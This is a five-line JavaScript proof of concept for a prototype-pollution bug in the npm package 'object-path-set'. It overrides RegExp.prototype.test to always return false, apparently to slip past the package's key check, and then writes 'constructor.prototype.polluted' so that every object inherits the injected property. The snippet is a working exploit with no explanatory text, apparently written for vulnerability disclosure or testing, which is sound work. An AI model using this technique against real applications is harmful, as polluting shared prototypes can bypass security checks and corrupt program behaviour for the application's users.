RegExp.prototype.test = () => false;
const setPath = require('object-path-set');
console.log({}.polluted);
setPath({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);